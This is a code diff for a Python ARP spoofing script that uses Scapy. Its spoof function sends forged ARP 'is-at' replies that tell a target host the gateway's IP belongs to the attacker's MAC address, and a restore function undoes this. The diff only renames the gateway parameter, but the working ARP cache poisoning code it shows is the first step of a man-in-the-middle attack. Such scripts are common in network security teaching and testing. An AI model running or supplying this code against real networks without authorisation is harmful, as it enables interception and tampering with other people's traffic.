@@ -14,23 +14,23 @@ def get_mac(ip):
 		return ans[0][1].src
 
 
-def spoof(target_ip, gateway, verbose=True):
+def spoof(target_ip, gateway_ip, verbose=True):
 
 	target_mac = get_mac(target_ip)
-	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway, op='is-at')
+	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op='is-at')
 	send(arp_response, verbose=0)
 
 	if verbose:
 		self_mac = ARP().hwsrc
-		print("Sent to {} : {} is-at {}".format(target_ip, gateway, self_mac))
+		print("Sent to {} : {} is-at {}".format(target_ip, gateway_ip, self_mac))
 
 
-def restore(target_ip, gateway, verbose=True):
+def restore(target_ip, gateway_ip, verbose=True):
 
 	target_mac = get_mac(target_ip)
-	gateway_mac = get_mac(gateway)
+	gateway_mac = get_mac(gateway_ip)
 
-	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway, hwsrc=gateway_mac, op='is-at')
+	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op='is-at')
 	send(arp_response, verbose=0, count=7)
 	if verbose:
-		print("Sent to {} : {} is-at {}".format(target_ip, gateway, gateway_mac))
+		print("Sent to {} : {} is-at {}".format(target_ip, gateway_ip, gateway_mac))
